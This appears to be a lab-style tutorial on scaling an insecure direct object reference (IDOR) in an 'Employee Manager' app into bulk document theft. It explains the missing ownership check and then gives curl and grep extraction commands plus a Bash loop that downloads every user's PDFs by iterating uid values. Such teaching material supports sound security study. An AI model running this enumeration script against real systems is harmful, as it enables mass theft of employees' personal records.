## Overview

Some IDORs are trivial:

- change `id=1` to `id=2`
- access another user’s record
- confirm data exposure

Others require more work:

- understanding how object references are generated
- identifying hidden parameters
- mapping file naming patterns
- automating extraction at scale

This note focuses on turning a basic IDOR into **mass data collection**.

Think of basic IDOR as finding one unlocked mailbox.  
Mass IDOR enumeration is realising the whole street uses the same weak lock and then systematically opening every box.

---

# 1. Lab Scenario

The target is an **Employee Manager** application.

We are assumed to be logged in as:

```text
uid=1
```

In a real application, this would require valid credentials, but the IDOR logic is the same.

When clicking **Documents**, we are sent to:

```text
/documents.php?uid=1
```

This is the first important clue:

- the user identifier is exposed directly
- the application appears to use `uid` to decide whose documents to show

That makes `uid` a high-value test parameter.

---

# 2. Static File IDOR Clue

The listed documents follow a predictable naming pattern:

```text
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

This suggests the file names include:

- document type
- user ID
- month/year

Example structure:

```text
Invoice_<uid>_<month>_<year>.pdf
Report_<uid>_<month>_<year>.pdf
```

This is a classic **static file IDOR** pattern.

## Why this matters

If naming is predictable, an attacker may be able to:

- guess filenames for other users
- brute-force reports/invoices
- download documents directly without using the UI

But this only works well if:

- file naming is consistent
- document types are known
- enough pattern information is available

So while useful, direct filename guessing is not always the best first approach.

---

# 3. Parameter-Based IDOR

A stronger lead is the URL parameter itself:

```text
documents.php?uid=1
```

If the backend trusts that value and does not check ownership, then changing it may expose another employee’s records.

## Test

Change:

```text
?uid=1
```

to:

```text
?uid=2
```

At first, the page may look similar.

This is where attention to detail matters.

---

# 4. Always Check the Actual Linked Data

Even if the page layout stays the same, the underlying files may have changed.

For `uid=2`, the linked files become:

```text
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

That confirms:

- the `uid` parameter controls which employee documents are returned
- there is no effective backend access control
- one user can access another user’s documents

This is the real IDOR.

---

# 5. Why This Happens

The application appears to rely on the frontend or URL context to decide which documents to show.

What it should do server-side is something like:

- get the logged-in user from the session
- compare session user to requested resource owner
- deny access if they do not match

Instead, it seems to do:

- trust `uid` from the request
- return whatever documents belong to that ID

That is the core backend access control failure.

---

# 6. Signs of a Good Mass Enumeration Candidate

This target is ideal for mass IDOR exploitation because it has:

- a predictable object reference: `uid`
- sequential identifiers
- directly accessible document links
- predictable file paths
- stable HTML structure

These are exactly the ingredients you want when turning a one-off IDOR into bulk data theft.

---

# 7. Moving from Manual to Mass Enumeration

Manual testing works for confirming the bug:

- `uid=1`
- `uid=2`
- `uid=3`

But it does not scale.

In a real environment with:

- hundreds of users
- thousands of users
- many files per user

manual browsing becomes inefficient fast.

So the next step is automation.

Common options:

- Burp Intruder
- ZAP Fuzzer
- Bash scripts
- PowerShell scripts
- Python scripts

The note uses Bash.

---

# 8. Finding a Reliable Extraction Pattern

Inspecting the HTML shows:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

This gives us two useful things:

- a stable HTML marker:
  ```html
  <li class='pure-tree_link'>
  ```
- a stable file path pattern:
  ```text
  /documents/...pdf
  ```

Rather than scraping the whole page manually, we can extract only the document links.

---

# 9. Quick Manual Extraction with `curl`

Basic extraction:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```

This returns:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

That confirms the links can be pulled directly from the response.

---

# 10. Cleaner Extraction with Regex

A better way is to extract only the file paths.

Example:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Output:

```text
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

## Why this is better

Instead of parsing HTML manually, this extracts only:

- the file paths
- in a format ready for automation

This makes the next step much cleaner.

---

# 11. Bash Script for Mass Download

The note provides the following script:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

---

# 12. How the Script Works

## Base URL

```bash
url="http://SERVER_IP:PORT"
```

Defines the target.

---

## Outer loop

```bash
for i in {1..10}; do
```

Loops through user IDs:

- 1
- 2
- 3
- ...
- 10

This assumes:

- IDs are numeric
- IDs are sequential
- the attacker wants records for a range of users

---

## Inner loop

```bash
for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
```

For each `uid`, it:

1. requests the documents page
2. extracts all `.pdf` links
3. iterates through them

---

## Download step

```bash
wget -q $url/$link
```

Downloads each discovered document quietly.

---

# 13. Result

Running the script downloads all documents for users:

```text
uid = 1 through 10
```

This turns a simple IDOR into:

- bulk document harvesting
- mass employee record exposure
- automated data exfiltration

That is why even a “small” IDOR can become very serious.

---

# 14. Why This Is Powerful

The vulnerability is not just:

- “user 1 can read user 2’s invoice”

It is:

- “any user can enumerate every employee document at scale”

This massively increases impact.

Real-world consequences could include exposure of:

- payroll data
- HR records
- contracts
- invoices
- internal reports
- sensitive personal information

# 15. Better Targets Than Just `uid`

The note also hints at other common IDOR-style parameters, such as:

- `uid_filter=1`
- file names
- hidden API selectors
- document type filters

These may allow:

- narrowing to one user
- removing the filter entirely
- listing all records at once

Always test whether:

- the parameter can be changed
- the parameter can be removed
- the parameter can accept wildcards or empty values

# 16. Practical Testing Workflow

## Step 1 – Identify direct references

Look for:

- `uid`
- `id`
- `user`
- `account`
- `doc`
- `file`
- `invoice`
- `report`

---

## Step 2 – Confirm the IDOR manually

Change:

```text
uid=1 → uid=2
```

and verify whether the returned resources actually differ.

Do not trust only page appearance.

Check:

- file names
- image paths
- JSON responses
- document metadata
- source code
- response length

---

## Step 3 – Extract references programmatically

Use:

- `curl`
- `grep`
- regex
- Burp Intruder
- custom scripts

---

## Step 4 – Automate collection

Loop through:

- sequential user IDs
- file names
- document types
- date ranges

and collect everything the application exposes.

---

# 17. When Mass Enumeration Gets Harder

Mass IDOR is easy when:

- IDs are sequential
- resources are linked directly
- response format is stable

It becomes harder when:

- IDs are UUIDs
- references are encoded
- references are hashed
- resource names are dynamic
- access control exists for some actions but not others

In those cases, you may need:

- multiple accounts
- source code review
- JS analysis
- API replay
- role comparison

But the core idea is the same:
find the object reference, understand the pattern, and automate the abuse.

# 18. Burp / ZAP Alternatives

Instead of Bash, you could also use:

## Burp Intruder
Useful for:
- fuzzing `uid`
- identifying valid responses
- collecting response lengths

## ZAP Fuzzer
Useful for:
- parameter fuzzing
- bulk testing
- spotting response differences

These tools are especially useful when:

- the target needs cookies/session state
- links are not static
- the HTML is inconsistent
- more advanced filtering is needed

---

# 19. Key Takeaways

- mass IDOR enumeration is about scaling a confirmed IDOR into bulk data access
- sequential identifiers like `uid=1,2,3...` are ideal for enumeration
- always inspect the actual linked resources, not just page appearance
- static file naming patterns can strengthen IDOR exploitation
- HTML structure often gives you a stable scraping pattern
- simple shell tools like `curl`, `grep`, and `wget` are often enough for bulk extraction
- even a “minor” IDOR can become a major breach once automated
